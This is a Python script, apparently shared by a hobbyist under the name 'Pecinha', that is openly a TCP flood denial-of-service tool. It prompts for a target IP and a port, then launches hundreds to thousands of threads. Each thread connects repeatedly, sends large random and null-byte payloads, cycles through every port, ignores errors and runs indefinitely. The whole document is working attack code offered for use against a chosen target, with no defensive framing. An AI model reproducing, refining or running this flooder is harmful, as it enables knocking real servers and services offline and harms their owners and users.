print("\033[92m")
import os
import sys
import time
import socket
import random
import threading
from datetime import datetime

os.system("clear")
os.system("figlet Pecinha ddos || echo Pecinha ddos")

print("\033[92mCoded By : Pecinha")
print("Version  : TCP ULTRA FLOOD 2025")
print("Github   : os mlk vai pacota")
print()

ip = input("\033[92mIP Alvo      : \033[0m")
port = int(input("\033[92mPorta inicial: \033[0m"))
threads = int(input("\033[92mThreads (500-2000) : \033[93m") or 1000)
intensity = int(input("\033[92mPacotes por conexão (10-100) : \033[93m") or 50)

os.system("clear")
os.system("figlet ATTACK STARTED")

payload = random._urandom(4096)  # pacote maior = mais impacto
sent = 0
lock = threading.Lock()

def tcp_flood():
    global sent
    current_port = port
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # desabilita Nagle = mais rápido
            s.settimeout(3)
            s.connect((ip, current_port))

            # manda MUITOS pacotes na mesma conexão
            for _ in range(intensity):
                s.sendall(payload)
                s.sendall(b"\x00" * 1024)      # lixo extra
                s.sendall(payload)

            s.close()

            with lock:
                sent += intensity
                print(f"\033[92m[+] {sent:,} pacotes → {ip}:{current_port} | Thread {threading.current_thread().name}\033[0m")

        except:
            pass  # porta fechada, bloqueio, etc → ignora e continua

        current_port += 1
        if current_port > 65534:
            current_port = 1

# Inicia o ataque com muitas threads
print(f"\n\033[91mGAMKERS TCP ULTRA FLOOD INICIADO → {threads} threads\033[0m\n")
time.sleep(3)

for i in range(threads):
    t = threading.Thread(target=tcp_flood, daemon=True)
    t.start()

# Mantém o script rodando forever
try:
    while True:
        time.sleep(10)
except KeyboardInterrupt:
    print("\n\033[91mAtaque parado pelo usuário\033[0m")
    os._exit(0)
    
